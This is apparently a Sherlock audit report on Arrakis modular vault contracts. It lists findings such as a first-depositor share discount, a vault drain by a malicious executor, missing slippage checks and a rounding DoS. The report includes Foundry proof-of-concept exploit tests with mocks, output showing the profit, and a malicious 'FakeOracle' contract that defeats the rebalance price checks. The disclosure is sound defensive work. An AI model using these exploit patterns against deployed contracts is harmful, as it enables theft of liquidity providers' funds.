# Issue H-1: First depositor via new module mints large amount of shares at huge discount 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/25 

## Found by 
juaan
## Summary

When a new module is set, the first depositor via that module pays `proportion*_init0` instead of paying `proportion*reserves0`  in minting costs.

They buy shares for very cheap, then dump them straight away at the correct price for profit.

This is currently blocked by the issue where liquidity is being withdrawn to the manager.

## Vulnerability Detail

When a new module is set, 100% of the liquidity from the old pool is withdrawn, and re-deposited via the new one.

The re-depositing occurs via the `initializePosition()` function rather than the `deposit()` function. The issue is that the `notFirstDeposit` flag remains `false`, since `initializePosition()` does not toggle it to `true` (only `deposit()` does).

Then when the first deposit occurs through the new module, since the `notFirstDeposit` flag is false, the mint cost is calculated via:

```solidity
amount0 = FullMath.mulDivRoundingUp(proportion_, _amt0, BASE);
amount1 = FullMath.mulDivRoundingUp(proportion_, _amt1, BASE);
```

On the first deposit, `_amt0` and `_amt1`  are hard-coded to `init0`  and `init1`  respectively, instead of being assigned as the pool’s reserves.

(Proof [here](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/modules/ValantisHOTModulePublic.sol#L66-L67) )

Hence, the user can mint `proportion_`  of the total supply of shares, but only pay for `init0 * proportion_` , instead of paying `reserves0 * proportion` 

`reserves0`  are likely to be much larger than `init0` , so the first depositor gets a large discount in the mint cost.

## Impact

The first depositor in a newly set module can mint tokens at a very cheap cost. Note that this issue is blocked by another one, which incorrectly withdraws all the funds on the first deposit. 

However once that is fixed, this issue will allow someone to mint large amounts of shares, and instantly redeem them for a large profit.

## Proof of Concept

Since this logical flaw can only be demonstrated if another separate issue is removed, in order for the PoC to work, this [line of code](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/modules/ValantisHOTModulePublic.sol#L61) should been commented out in `ValantisHOTModulePublic`

To run the PoC:

- add the foundry test to `arrakis-modular/test/integration` , and add the mocks to `arrakis-modular/test/integration/mocks`
- run `forge test --mt test_wrongSharePrice_withBugRemoved -vv`

**PoC Summary:**

1. Set new module for a vault (with new pool and ALM)
2. User mints `totalSupply`
3. User burns `totalSupply`  (half of the now total supply), collecting major profit

**Console output:**

```bash
Ran 1 test for test/integration/H9.t.sol:PoC_FundsSentToArrakisManager_Incorrectly
[PASS] test_wrongSharePrice_withBugRemoved() (gas: 3221760)
Logs:
  
  [Before Mint+Burn] reserves0: 1e10, reserves1: 5e18
  
  [After Mint+Burn] reserves0: 6e9, reserves1: 3e18
  
  Mint cost: 2e9 USDC and 1e18 ETH
  Redeemed amount: 6e9 USDC and 3e18 ETH

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 461.04ms

Ran 1 test suite in 461.04ms: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

<details><summary> Foundry Test </summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

// Foundry imports
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";


import {ArrakisMetaVaultPublic} from
    "../../src/ArrakisMetaVaultPublic.sol";
    import {ArrakisMetaVault} from
    "../../src/abstracts/ArrakisMetaVault.sol";
import {TimeLock} from
    "../../src/TimeLock.sol";
import {ArrakisStandardManager} from
    "../../src/ArrakisStandardManager.sol";
import {IModuleRegistry} from
    "../../src/interfaces/IModuleRegistry.sol";
import {ValantisModulePublic} from
    "../../src/modules/ValantisHOTModulePublic.sol";
import {IValantisHOTModule} from
    "../../src/interfaces/IValantisHOTModule.sol";

import {TEN_PERCENT} from "../../src/constants/CArrakis.sol";

import {ValantisModule} from "../../src/abstracts/ValantisHOTModule.sol";
import {IArrakisMetaVaultPublic} from
    "../../src/interfaces/IArrakisMetaVaultPublic.sol";
import {IArrakisMetaVault} from
    "../../src/interfaces/IArrakisMetaVault.sol";
import {IArrakisStandardManager} from
    "../../src/interfaces/IArrakisStandardManager.sol";
import {IOwnable} from "../../src/interfaces/IOwnable.sol";

import {SovereignPool} from  "../../lib/valantis-hot/lib/valantis-core/src/pools/SovereignPool.sol";

// Mocks
import {OracleWrapper} from "./mocks/OracleWrapper.sol";
import {SovereignPoolMock} from "./mocks/SovereignPoolMock.sol";
import {SovereignALMMock} from "./mocks/SovereignALMMock.sol";

//Base Test
import {ValantisIntegrationPublicTest} from "./ValantisIntegrationPublic.t.sol";

contract PoC_FundsSentToArrakisManager_Incorrectly is ValantisIntegrationPublicTest {
  
    address vaultManager;
    address minter;

    address public constant OWNER_EOA = 0x529a65684a6923958ab6b7DF7B909a8D5e1580ae;

    function test_wrongSharePrice_withBugRemoved() public {
        
        // #region Vault Init
        minter = makeAddr("minter");
        vaultManager = IArrakisMetaVault(vault).manager();

        deal(address(token0), minter, init0*5); // 2000e6 (0: USDC)
        deal(address(token1), minter, init1*5); // 1e18   (1: WETH)
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");

        address oldModule = address(IArrakisMetaVault(vault).module());
        
        SovereignPoolMock newPool = new SovereignPoolMock();
        newPool.setToken0AndToken1(address(token0), address(token1));

        //User mints from meta vault, using old module
        vm.startPrank(minter);
        token0.approve(oldModule, init0*5);
        token1.approve(oldModule, init1*5);

        IArrakisMetaVaultPublic(vault).mint(5e18, minter); // first deposit
        vm.stopPrank();
        // #endregion Vault Init

        
     

        TimeLock timelock = TimeLock(payable(IOwnable(vault).owner()));
        
        // Initialisation Data for the newly whitelisted module
        bytes[] memory initData = new bytes[](1);
        initData[0] = abi.encodeWithSelector(
            ValantisModule.initialize.selector,
            address(newPool), 2e9, 1e18, 1e5, vault
        );

        bytes memory whitelistModulesPayload = abi.encodeWithSelector(
            ArrakisMetaVault.whitelistModules.selector,
            IModuleRegistry(moduleRegistry).beacons(), // use the existing module implementation, no changes needed
            initData
        );

        //Whitelist the new module
        vm.startPrank(OWNER_EOA);
        timelock.schedule(vault, 0, whitelistModulesPayload, bytes32(0), bytes32(uint256(0xff)), 2 days);
        vm.warp(block.timestamp + 2 days);
        timelock.execute(vault, 0, whitelistModulesPayload, bytes32(0), bytes32(uint256(0xff)));
        vm.stopPrank();

        bytes memory almPayload = abi.encodeWithSelector(
            ValantisModule.setALMAndManagerFees.selector,
            address(new SovereignALMMock(address(token0), address(token1), address(newPool))),
            oracle
        );

        address[] memory modules = ArrakisMetaVaultPublic(vault).whitelistedModules();

        // set ALM for the new module
        //note: A mock ALM is used for simplicity of setup, but it will still work with a real ALM
        vm.startPrank(OWNER_EOA);
        timelock.schedule(modules[1], 0, almPayload, bytes32(0), bytes32(uint256(0xff)), 2 days);
        vm.warp(block.timestamp + 2 days);
        timelock.execute(modules[1], 0, almPayload, bytes32(0), bytes32(uint256(0xff)));

        vm.stopPrank();

        // A call will be made to the new module to initialize the LP position
        bytes[] memory payloads = new bytes[](1);
        
        // initializePosition (Deposits liquidity into ALM)
        payloads[0] = abi.encodeWithSelector(
            ValantisModule.initializePosition.selector
        );

        // Set the module and pass in payload
        vm.startPrank(executor);
        ArrakisStandardManager(payable(manager)).setModule(vault, modules[1], payloads);
       

        deal(address(token0), minter, init0*5); // 2000e6 (0: USDC)
        deal(address(token1), minter, init1*5); // 1e18   (1: WETH)
        address newModule = modules[1];
        
        //Now, a minter mints shares from the vault, as the first depositor
        uint256 totalSupply = ArrakisMetaVaultPublic(vault).totalSupply();
        //console.log("totalSupply is %e: ", totalSupply);
        vm.startPrank(minter);
        token0.approve(newModule, type(uint256).max);
        token1.approve(newModule, type(uint256).max);

        (uint256 res0, uint256 res1) = newPool.getReserves();
        console.log("[Before Mint+Burn] reserves0: %e, reserves1: %e", res0, res1);


        //@e here it all gets sent to the manager
        (uint256 amount_0_in, uint256 amount_1_in) = IArrakisMetaVaultPublic(vault).mint(totalSupply, minter);
        (uint256 amount_0_out, uint256 amount_1_out) = IArrakisMetaVaultPublic(vault).burn(totalSupply, minter);
        vm.stopPrank();

        (res0, res1) = newPool.getReserves();
        console.log("[After Mint+Burn] reserves0: %e, reserves1: %e", res0, res1);
    

        console.log("");
        console.log("Mint cost: %e USDC and %e ETH", amount_0_in, amount_1_in);
        console.log("Redeemed amount: %e USDC and %e ETH", amount_0_out, amount_1_out);        
    }
}
```
</details>

<details><summary> SovereignALMMock.sol </summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeCast} from
    "@openzeppelin/contracts/utils/math/SafeCast.sol";

import {SovereignPool} from  "../../../lib/valantis-hot/lib/valantis-core/src/pools/SovereignPool.sol";

contract SovereignALMMock {
    address public token0;
    address public token1;

    SovereignPool pool;

    constructor(address t0, address t1, address _pool) {
        token0 = t0;
        token1 = t1;
        pool = SovereignPool(_pool);
    }

    function getReservesAtPrice(uint160)
        external
        view
        returns (uint128 reserves0, uint128 reserves1)
    {
        reserves0 = SafeCast.toUint128(
            IERC20(token0).balanceOf(address(this))
        );
        reserves1 = SafeCast.toUint128(
            IERC20(token1).balanceOf(address(this))
        );
    }

    function depositLiquidity(
        uint256 _amount0,
        uint256 _amount1,
        uint160,
        uint160
    )
        external
        returns (uint256 amount0Deposited, uint256 amount1Deposited)
    {
        IERC20(token0).transferFrom(msg.sender, address(this), _amount0);
        IERC20(token1).transferFrom(msg.sender, address(this), _amount1);

        IERC20(token0).approve(address(pool), _amount0);
        IERC20(token1).approve(address(pool), _amount1);

        (amount0Deposited, amount1Deposited) = SovereignPool(pool).depositLiquidity(
            _amount0,
            _amount1,
            msg.sender, // the module
            '',
            ''
        );
    }

    function withdrawLiquidity(
        uint256 amount0,
        uint256 amount1,
        address receiver,
        uint160,
        uint160
    ) external {
        pool.withdrawLiquidity(amount0, amount1, msg.sender, receiver, '');
    }
    
}
```
</details>

<details><summary> SovereignPoolMock.sol </summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {console} from "forge-std/console.sol";

contract SovereignPoolMock {
    IERC20 public token0;
    IERC20 public token1;

    uint256 public managerBalance0;
    uint256 public managerBalance1;

    uint256 public managerFeeBIPS;

    uint256 public reserves0;
    uint256 public reserves1;

    address public immutable sovereignVault;
    address public verifierModule;
    
    constructor() {
        sovereignVault = address(this);
    }

    function depositLiquidity(
        uint256 _amount0,
        uint256 _amount1,
        address _sender,
        bytes calldata _verificationContext,
        bytes calldata _depositData
    ) external returns (uint256 amount0Deposited, uint256 amount1Deposited) {
        

        uint256 token0PreBalance = token0.balanceOf(address(this));
        uint256 token1PreBalance = token1.balanceOf(address(this));

        console.log("pre0", token0PreBalance);
        console.log("pre1", token1PreBalance);

        token0.transferFrom(
            msg.sender, address(this), _amount0
        );
        token1.transferFrom(
            msg.sender, address(this), _amount1
        );

        amount0Deposited = token0.balanceOf(address(this)) - token0PreBalance;
        amount1Deposited = token1.balanceOf(address(this)) - token1PreBalance;
    }

    function withdrawLiquidity(
        uint256 _amount0,
        uint256 _amount1,
        address _sender,
        address _recipient,
        bytes calldata _verificationContext
    ) external {

        if (_amount0 > 0) {
            token0.transfer(_recipient, _amount0);
        }

        if (_amount1 > 0) {
            token1.transfer(_recipient, _amount1);
        }
    }

    function setReserves(
        uint256 reserves0_,
        uint256 reserves1_
    ) external {
        reserves0 = reserves0_;
        reserves1 = reserves1_;
    }

    function setToken0AndToken1(
        address token0_,
        address token1_
    ) external {
        token0 = IERC20(token0_);
        token1 = IERC20(token1_);
    }

    function setManagesFees(
        uint256 managerBalance0_,
        uint256 managerBalance1_
    ) external {
        managerBalance0 = managerBalance0_;
        managerBalance1 = managerBalance1_;
    }

    function setPoolManagerFeeBips(uint256 poolManagerFeeBips_)
        external
    {
        managerFeeBIPS = poolManagerFeeBips_;
    }

    function claimPoolManagerFees(
        uint256,
        uint256
    )
        external
        returns (
            uint256 feePoolManager0Received,
            uint256 feePoolManager1Received
        )
    {
        feePoolManager0Received = managerBalance0;
        feePoolManager1Received = managerBalance1;
        if (managerBalance0 > 0) {
            IERC20(token0).transfer(msg.sender, managerBalance0);
        }

        if (managerBalance1 > 1) {
            IERC20(token1).transfer(msg.sender, managerBalance1);
        }
    }

    // #region view functions.

    function getPoolManagerFees()
        external
        view
        returns (uint256 poolManagerFee0, uint256 poolManagerFee1)
    {
        poolManagerFee0 = managerBalance0;
        poolManagerFee1 = managerBalance1;
    }

    function poolManagerFeeBips() external view returns (uint256) {
        return managerFeeBIPS;
    }

    function getReserves() external view returns (uint256, uint256) {
        return (token0.balanceOf(address(this)), token1.balanceOf(address(this)));
    }

    // #endregion view functions.
}

```
</details>

## Code Snippet
https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/modules/ValantisHOTModulePublic.sol#L66-L67

## Tool used

Manual Review

## Recommendation

Make sure that the user pays `proportion * reserve0` and `proportion * reserve1`

This can be achieved by setting the `notFirstDeposit` flag to `true` within `initializePosition()`.

# Issue H-2: When the poolManager is changed to address(0), the manager fees are permanently lost 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/28 

## Found by 
juaan
## Summary

See detail

## Vulnerability Detail

The `SovereignPool` contract has a function `setPoolManager` which allows the existing `poolManager` to change the `poolManager` of the pool.

```solidity
function setPoolManager(address _manager) external override onlyPoolManager nonReentrant {
        poolManager = _manager;
        
        if (_manager == address(0)) {
            poolManagerFeeBips = 0;
            // It will be assumed pool is not going to contribute anything to protocol fees.
            _claimPoolManagerFees(0, 0, msg.sender);
            emit PoolManagerFeeSet(0);
        }

        emit PoolManagerSet(_manager);
    }
```

They can change it to `address(0)` , and in this case the pool manager fees are claimed (as seen in the above snippet)

The `poolManager` is a `ValantisHOTModule`, and the **ONLY WAY** to call `setPoolManager` from a `ValantisHOTModule` would be via `ValantisHOTModule.swap()` since it makes a low level call [here](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L375-L378), and that call can be directed to `pool.setPoolManager` 

However, the issue is that the pool manager fees are claimed to `msg.sender` which is the `ValantisHOTModule` and not the `ArrakisStandardManager`. Then, these fees will be re-deposited to the pool in the flow of `ValantisHOTModule.swap()` , so the funds will not be obtainable by the `ArrakisStandardManager` .

(This fund loss is demonstrated and asserted in the PoC)

## Impact

There is only one way to call `setPoolManager` from the `ValantisHOTModule`, but this leads to permanently lost manager fees.

Fees which are meant for the Arrakis manager are re-deposited into the pool and never claimable by the manager.

## Proof of Concept

Here is a coded proof of concept demonstrating the vulnerability in action.

To run it, add the following code to a new file within the `arrakis-modular/test/integration` directory. Then run `forge test --mt  test_changePoolManager_toZeroAddress` in the terminal.

<details><summary>Foundry test </summary>

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;


// Foundry Imports
import {console} from "forge-std/console.sol";
import {Vm} from "forge-std/Vm.sol";
import {Test} from "forge-std/Test.sol";

// Arrakis Imports
import {IArrakisMetaVaultPublic} from
    "../../src/interfaces/IArrakisMetaVaultPublic.sol";
import {IArrakisMetaVault} from
    "../../src/interfaces/IArrakisMetaVault.sol";
import {IArrakisStandardManager} from
    "../../src/interfaces/IArrakisStandardManager.sol";

// Valantis Imports
import {IValantisHOTModule} from
    "../../src/interfaces/IValantisHOTModule.sol";
import {SovereignPool} from  "../../lib/valantis-hot/lib/valantis-core/src/pools/SovereignPool.sol";
import {HOT} from "@valantis-hot/contracts/HOT.sol";

// Base Test
import {ValantisIntegrationPublicTest} from "./ValantisIntegrationPublic.t.sol";

contract PoC_ChangePoolManager_ToZeroAddress is ValantisIntegrationPublicTest {

    address attacker;
    address rec;
    
    function test_changePoolManager_toZeroAddress() public {
        rec = makeAddr("rec");
        attacker = makeAddr("attacker");

        address m = address(IArrakisMetaVault(vault).module());
        assertEq(pool.poolManager(), m);

        deal(address(token0), rec, init0); // 2000e6 (0: USDC)
        deal(address(token1), rec, init1); // 1e18   (1: WETH)

        //@e user mints from meta vault
        vm.startPrank(rec);
        token0.approve(m, init0);
        token1.approve(m, init1);

        IArrakisMetaVaultPublic(vault).mint(1e18, rec);
        vm.stopPrank();


        uint256 FEE_AMOUNT_0 = 1 wei;
        uint256 FEE_AMOUNT_1 = 1 wei;
        //@e Simulating 1 wei of fees in the `SovereignPool`
        vm.store(address(pool), bytes32(uint(5)), bytes32(FEE_AMOUNT_0));
        vm.store(address(pool), bytes32(uint(6)), bytes32(FEE_AMOUNT_1));

        // Sending the fee to the pool
        deal(address(token0), address(pool), token0.balanceOf(address(pool)) + FEE_AMOUNT_0);
        deal(address(token1), address(pool), token1.balanceOf(address(pool)) + FEE_AMOUNT_1);

        


        bool zeroForOne = false;
        uint256 amountIn = 1; // Using small values since we are not actually swapping anything
        uint256 expectedMinReturn = 1;

        //uint256 lowestRatio = FullMath.mulDiv(IOracleWrapper(oracle).getPrice1(), 1e6 - IValantisHOTModule(m).maxSlippage(), 1e6);
        //uint256 lowest_expectedMinReturn = 1+ FullMath.mulDiv(lowestRatio, amountIn, 10 ** ERC20(token1).decimals());

        bytes memory payload = abi.encodeWithSelector(
            SovereignPool.setPoolManager.selector, 
            address(0) // new poolmanager
        );

        bytes memory data = abi.encodeWithSelector(
            IValantisHOTModule.swap.selector,
            zeroForOne,
            expectedMinReturn,
            amountIn,
            address(pool),
            0, //note: this 0,0 lets us skip the checks in `HOT::_checkSpotPriceRange` during depositLiquidity
            0,
            payload
        );

        bytes[] memory datas = new bytes[](1);
        datas[0] = data;
        
        (uint256 reserves0Before, uint256 reserves1Before) = pool.getReserves();
        // Execute the transaction
        vm.prank(executor);
        IArrakisStandardManager(manager).rebalance(vault, datas);
        (uint256 reserves0After, uint256 reserves1After) = pool.getReserves();
        
        assertEq(pool.poolManager(), address(0));

        // Assert that fees meant for the manager were re-deposited
        assertEq(reserves0After, reserves0Before + FEE_AMOUNT_0);
        assertEq(reserves1After, reserves1Before + FEE_AMOUNT_1);
        
        // Assert that the remaining fees is 0
        (uint256 fee0, uint256 fee1) = pool.getPoolManagerFees();
        assertEq(fee0, 0);
        assertEq(fee1, 0);
    }
}
```
</details>

## Code Snippet
https://github.com/ValantisLabs/valantis-core/blob/e377e7eca375f398769f92e99f2d86232b4c1bff/src/pools/SovereignPool.sol#L452-L468

## Tool used
Manual Review

## Recommendation

# Issue H-3: ArrakisMetaVault::setModule Malicious executor can drain the vault by calling withdraw after initializePosition 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/50 

## Found by 
cergyk, juaan
## Summary

A malicious executor, after a new module is whitelisted by an admin, can drain the vault by calling `ArrakisStandardManager.setModule()` with a malicious `payloads_`.

## Vulnerability Detail

The `setModule()` function of the `ArrakisStandardManager` contract allows an executor to set a new module for a vault: [ArrakisStandardManager.sol#L438](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/ArrakisStandardManager.sol#L438).

It calls `ValantisModule.withdraw()`, to withdraw the funds from the pool and transfer to the new module: [ValantisHOTModule.sol#L235](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L235).

Once the vault's funds are in the new module, the first malicious `payloads_` is executed and calls `ValantisModule::initializePosition` to deposit the liquidity back into the pool: [ValantisHOTModule.sol#L148](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L148).

Lastly, the second `payloads_` of the malicious executor gets executed and calls `ValantisModulePublic::withdraw` which calls `ValantisModule::withdraw` on the new module and withdraws all funds to an arbitrary address: [ValantisHOTModule.sol#L203](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/abstracts/ValantisHOTModule.sol#L235).

## Impact

Theft of all funds in the vault.

## Scenario

1. Owner whitelists a legitimate new module with `ArrakisMetaVault::whitelistModules`.
2. Malicious public vault executor calls `ArrakisStandardManager::setModule` with a malicious `payloads_`.
    1. It calls `ArrakisMetaVault::setModule`.
    2. It calls `ValantisModulePublic::withdraw` which calls `_module.withdraw(module_, BASE)` to withdraw all vault's funds from old to new module.
    3. Malicious executor has provided two payloads
        1. The first one calls `ValantisModule::initializePosition` to deposit liquidity into the new pool.
        2. Then the second malicious `payloads_` is executed and contains a call to `ValantisModule::withdraw` with attacker as the receiver 

> Please note that instead of calling `withdraw` on the new module, enabling direct theft of funds, the executor can also call `withdrawManagerBalance` which would transfer all the balance of the module to the manager. Or also not call any function at all (payloads is an empty array), and leave the balances in the module.

## Code Snippet

- [ArrakisMetaVault.sol#L130](https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/abstracts/ArrakisMetaVault.sol#L130)

## Tool used

Manual Review

## Recommendation
Check that the reserves in the new pool are correct after setting the new module, similarly to what is currently done at the end of `ArrakisStandardManager::rebalance`:
https://github.com/sherlock-audit/2024-03-arrakis/blob/d7946ee784ca8df3246d723e8b92529447e23bb7/arrakis-modular/src/ArrakisStandardManager.sol#L391-L414

# Issue M-1: Deposits/Withdrawals to/from Arrakis Vaults can be sandwiched due to no slippage checks in mint/burn functions 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/37 

## Found by 
iamandreiski
## Summary

There are two instances in which deposits/withdrawals can be sandwiched: 
- When depositing funds through the Router, there is slippage protection, but when directly minting through the vault, no slippage protection is present, making all of the deposits prone to being sandwiched.
- Same goes for withdrawing directly by burning the shares on the vault instead of going through the router's `removeLiquidity()`.
- The above, coupled with the fact that depositing and withdrawing in the same block is possible, makes these user paths prone to sandwich attacks.

## Vulnerability Detail

There are two paths that a user can take when depositing or withdrawing liquidity from the vault. The first one is going through the ArrakisPublicVaultRouter, and the second one is directly through the vault's `mint` and `burn` functions.

For the purpose of this example, we're going to examine withdrawals, but the same flow is present for deposits as well.

When withdrawing / removing liquidity via the router, `removeLiquidity()` subsequently calls `_removeLIquidity()` in which the slippage control logic is located:

```solidity
function _removeLiquidity(RemoveLiquidityData memory params_)
        internal
        returns (uint256 amount0, uint256 amount1)
    {
        (amount0, amount1) = IArrakisMetaVaultPublic(params_.vault)
            .burn(params_.burnAmount, params_.receiver);

        if (
            amount0 < params_.amount0Min
                || amount1 < params_.amount1Min
        ) {
            revert ReceivedBelowMinimum();
        }
    }
```
The problem is, that a user can call `burn()` directly on the public vault, without having to go through the router:

```solidity
function burn(
        uint256 shares_,
        address receiver_
    ) external returns (uint256 amount0, uint256 amount1) {
        if (shares_ == 0) revert BurnZero();
        uint256 supply = totalSupply();
        if (shares_ > supply) revert BurnOverflow();

        uint256 proportion = FullMath.mulDiv(shares_, BASE, supply);

        if (receiver_ == address(0)) revert AddressZero("Receiver");

        _burn(msg.sender, shares_);

        (amount0, amount1) = _withdraw(receiver_, proportion);

        emit LogBurn(shares_, receiver_, amount0, amount1);
    }

```
The function above will calculate the proportion based on the shares that we want to burn and the total supply.  The other problem is that the amount of the two tokens that we will receive is based on the supply of the pools:

```solidity

 function withdraw(
        address receiver_,
        uint256 proportion_
    )
        public
        virtual
        onlyMetaVault
        nonReentrant
        returns (uint256 amount0, uint256 amount1)
    {

        if (receiver_ == address(0)) revert AddressZero();
        if (proportion_ == 0) revert ProportionZero();
        if (proportion_ > BASE) revert ProportionGtBASE();

        {
            (uint256 _amt0, uint256 _amt1) = pool.getReserves();

            amount0 = FullMath.mulDiv(proportion_, _amt0, BASE);
            amount1 = FullMath.mulDiv(proportion_, _amt1, BASE);
        }

        if (amount0 == 0 && amount1 == 0) revert AmountsZeros();

        alm.withdrawLiquidity(amount0, amount1, receiver_, 0, 0);

        emit LogWithdraw(receiver_, proportion_, amount0, amount1);
    }

```

Since the amounts are based on the pool reserves, as well as the total supply of the share token, this can be easily manipulated and/or sandwiched in order to maliciously profit on the user's unprotected transactions.

Considering that deposits and withdrawals can be executed in the same block, plus flashloans can be utilized to aid in the sandwich attack.

## Impact
No slippage control allows for malicious bots/users to sandwich users who directly mint/burn tokens without going through the router.

## Code Snippet
https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/ArrakisMetaVaultPublic.sol#L51-L74
https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/ArrakisMetaVaultPublic.sol#L81-L98
## Tool used

Manual Review

## Recommendation
Make the mint/burn functions only callable from the router OR include slippage control arguments and checks in them as well.



# Issue M-2: Malicious Public Vault Owner can bypass `validateRebalance()`, to sandwich the rebalance for profit 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/43 

## Found by 
cergyk, iamandreiski, juaan
## Summary
The contest README states:
> Public vault owner is RESTRICTED

Hence their actions are not trusted.

## Vulnerability Detail
In `ArrakisStandardManager.rebalance()`, it uses `module.validateRebalance()` before and after the rebalance, in order to ensure that the AMM's spot price has not been significantly manipulated before and after the rebalance as this would allow for sandwich attacks.

```solidity
// check if the underlying protocol price has not been
// manipulated during rebalance.
// that can indicate a sandwich attack.
module.validateRebalance(info.oracle, info.maxDeviation);
```

However, via a 2-day timelock, a malicious public vault owner can choose the oracle address that is used (by calling `updateVaultInfo()`), and can set it to a malicious oracle which simply returns the AMM spot price. 

Example malicious oracle:
```solidity
contract FakeOracle {

    HOT alm;

    constructor(address _alm) {
        alm = HOT(_alm);
    }
   // Simply returns the AMM price so that validateRebalance() is useless
    function getPrice0() external view returns (uint256 price0) {
        uint256 sqrtSpotPriceX96;
        (sqrtSpotPriceX96,,) = alm.getAMMState();


        if (sqrtSpotPriceX96 <= type(uint128).max) {
            price0 = FullMath.mulDiv(
                sqrtSpotPriceX96 * sqrtSpotPriceX96,
                10 ** 6,
                2 ** 192
            );
        } else {
            price0 = FullMath.mulDiv(
                FullMath.mulDiv(
                    sqrtSpotPriceX96, sqrtSpotPriceX96, 1 << 64
                ),
                10 ** 6,
                1 << 128
            );
        }
    }
}
```

Then when the price deviation is calculated in `validateRebalance()`, it will be `0`, so won't revert even if the actual AMM price has been manipulated.

This then allows the malicious public vault owner to sandwich the rebalance and extract value from the LPs.

## Impact
Malicious public vault owner can steal funds from LPs by changing oracle parameter in `vaultInfo`.

## Code Snippet
https://github.com/sherlock-audit/2024-03-arrakis/blob/64a7dc6ccb5de2824870474a9f35fd3386669e89/arrakis-modular/src/ArrakisStandardManager.sol#L386

## Tool used
Manual Review

## Recommendation
Whitelist oracles that can be used



## Discussion

**Gevarist**

Hi, public vault owner is restricted with this timelock contract. We are assuming that these 2 days will give enough time for user to withdraw their fund if any malicious action is sheduled inside the timelock. We don't consider this finding as valid.

# Issue M-3: Adding liquidity can be `DoS`ed due to calculation mismatches 

Source: https://github.com/sherlock-audit/2024-03-arrakis-judging/issues/54 

## Found by 
KupiaSec, juaan, whitehair0330
## Summary

When users add liquidity, they send tokens to the `ArrakisPublicVaultRouter` contract. The `ValantisHOTModulePublic` contract then takes the required tokens from the `ArrakisPublicVaultRouter` contract. However, due to a calculation mismatch, the required amount is often greater than the user-sent amount, causing the transaction to be reverted.

## Vulnerability Detail

Let's consider following scenario:
1. The current state:
    - pool: `reserve0 = 1e18 + 1, reserve1 = 1e18 + 1`
    - vault: `totalSupply = 1e18 + 1`
2. Bob calls the `ArrakisPublicVaultRouter.addLiquidity()` function with the following parameters:
    - `amount0Max = 1e18, amount1Max = 1e18`
3. At [L139](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisPublicVaultRouter.sol#L139), the `_getMintAmounts()` function returns:
    - `(sharesReceived, amount0, amount1) = (1e18 - 1, 1e18 - 1, 1e18 - 1)`
4. The router contract takes `token0` and `token1` from Bob in amounts of `1e18 - 1` each and calls the `_addLiquidity()` function with above parameters.
5. In the `_addLiquidity()` function, `ArrakisMetaVaultPublic.mint(1e18 - 1, Bob)` is invoked at [L898](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisPublicVaultRouter.sol#L898).
6. In the `ArrakisMetaVaultPublic.mint()` function:
    - at [L58](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisMetaVaultPublic.sol#L58), the `proportion` is recalculated as `1e18 - 1`
    - `_deposit(1e18 - 1)` is called at [L71](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisMetaVaultPublic.sol#L71)
    - in the `_deposit()` function, `ValantisHOTModulePublic.deposit(router, 1e18 - 1)` is invoked at [L150](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/ArrakisMetaVaultPublic.sol#L150-L151)
7. In the `ValantisHOTModulePublic.deposit()` function:
    - `amount0 = 1e18, amount1 = 1e18`(at [L71, L73](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/modules/ValantisHOTModulePublic.sol#L71-L74))
    - at [L79, L80](https://github.com/sherlock-audit/2024-03-arrakis/blob/main/arrakis-modular/src/modules/ValantisHOTModulePublic.sol#L79-L80), it takes `token0` and `token1` from the router in amounts of `1e18` each

Finally, the process fails because there is only `1e18 - 1` in the router, as mentioned in step `4`.

This problem occurs because the calculations in the `ArrakisPublicVaultRouter._getMintAmounts()` function rely on rounding down. In contrast, the proportion calculation in the `ArrakisMetaVaultPublic.mint()` function and the amount calculations in the `ValantisHOTModulePublic.deposit()` function are based on rounding up.

## Impact

Adding liquidity can be `DoS`ed due to the calculation mismatches.

